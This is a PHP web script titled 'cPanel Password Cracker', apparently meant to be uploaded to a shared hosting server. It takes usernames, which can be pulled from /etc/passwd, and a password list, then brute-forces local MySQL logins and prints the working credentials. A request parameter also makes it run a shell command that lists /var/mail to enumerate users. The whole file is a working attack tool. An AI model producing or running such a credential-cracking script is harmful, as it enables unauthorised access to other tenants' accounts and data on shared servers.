<?php

@set_time_limit(0);
@error_reporting(0);


echo '<html>
<title>cPanel Password Cracker</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head>

<style type="text/css">
<!--
body {
	background-color: #000000;
    font-size: 18px;
	color: #cccccc;
}
input,textarea,select{
font-weight: bold;
color: #cccccc;
dashed #ffffff;
border: 1px
solid #2C2C2C;
background-color: #080808
}
a {
	background-color: #151515;
	vertical-align: bottom;
	color: #000;
	text-decoration: none;
	font-size: 20px;
	margin: 8px;
	padding: 6px;
	border: thin solid #000;
}
a:hover {
	background-color: #080808;
	vertical-align: bottom;
	color: #333;
	text-decoration: none;
	font-size: 20px;
	margin: 8px;
	padding: 6px;
	border: thin solid #000;
}
.style1 {
	text-align: center;
}
.style2 {
	color: #FFFFFF;
	font-weight: bold;
}
.style3 {
	color: #FFFFFF;
}
-->
</style>

</head>
';

if ($_POST['page'] == 'find') {
    if (isset($_POST['usernames']) && isset($_POST['passwords'])) {
        if ($_POST['type'] == 'passwd') {
            $e = explode("\n", $_POST['usernames']);
            foreach ($e as $value) {
                $k = explode(":", $value);
                $username .= $k['0'] . " ";
            }
        } elseif ($_POST['type'] == 'simple') {
            $username = str_replace("\n", ' ', $_POST['usernames']);
        }
        $a1 = explode(" ", $username);
        $a2 = explode("\n", $_POST['passwords']);
        $id2 = count($a2);
        $ok = 0;
        foreach ($a1 as $user) {
            if ($user !== '') {
                $user = trim($user);
                for ($i = 0; $i <= $id2; $i++) {
                    $pass = trim($a2[$i]);
                    if (@mysql_connect('localhost', $user, $pass)) {
                        echo "User is (<b><font color=green>$user</font></b>) Password is (<b><font color=red>$pass</font></b>)<br />";
                        $ok++;
                    }
                }
            }
        }
        echo "<hr><b>You Found <font color=red>$ok</font> Cpanel (Hacking Sec)</b>";
        echo "<center><b><a href=" . $_SERVER['PHP_SELF'] . ">BACK</a>";
        exit;
    }
}
?>

<form method="POST" target="_blank">
    <strong>
        <input name="page" type="hidden" value="find">
    </strong>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
        <tr>
            <td valign="top" bgcolor="#151515">
                <center><strong><img src="http://www.medianama.com/wp-content/uploads/anonymous.jpg"/><br>
                    </strong>
                    <a href="http://bgworm.com" class="style2"><strong>Cpanel Cracker By MaStErChO</strong></a></center>
            </td>
        </tr>
        <tr>
            <td>
                <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
                    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                        <strong>User :</strong></td>
                    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10"
                                                                                     name="usernames"></textarea></strong>
                    </td>
                    </tr>
                    <tr>
                        <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                            <strong>Pass :</strong></td>
                        <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10"
                                                                                         name="passwords"></textarea></strong>
                        </td>
                    </tr>
                    <tr>
                        <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
                            <strong>Type :</strong></td>
                        <td valign="top" bgcolor="#151515" colspan="5">
                            <span class="style2"><strong>Simple : </strong> </span>
                            <strong>
                                <input type="radio" name="type" value="simple" checked="checked"
                                       class="style3"></strong>
                            <font class="style2"><strong>/etc/passwd : </strong> </font>
                            <strong>
                                <input type="radio" name="type" value="passwd" class="style3"></strong><span
                                    class="style3"><strong>
	</strong>
	</span>
                        </td>
                    </tr>
                    <tr>
                        <td valign="top" bgcolor="#151515" style="width: 139px"></td>
                        <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="start">
</form>
</strong>
</td>
</tr>
</table>

<form style="border: 0px ridge #FFFFFF">
    <p align="center">
    <div align="center">
        <input type="submit" name="user" value="user">
        <option value="name"></select>
</form>


<div align="center">
    <table border="5" width="10%" bordercolorlight="#008000" bordercolordark="#006A00" height="100" cellspacing="5">
        <tr>
            <td bordercolorlight="#008000" bordercolordark="#006A00">
                <p align="left">
<textarea method='POST' rows="25" name="S1" cols="16">


<?php


if ($_GET['user'])


    system('ls /var/mail');


for ($uid = 0; $uid < 90000; $uid++) {

}


?></textarea>

                    </body>
                    </html>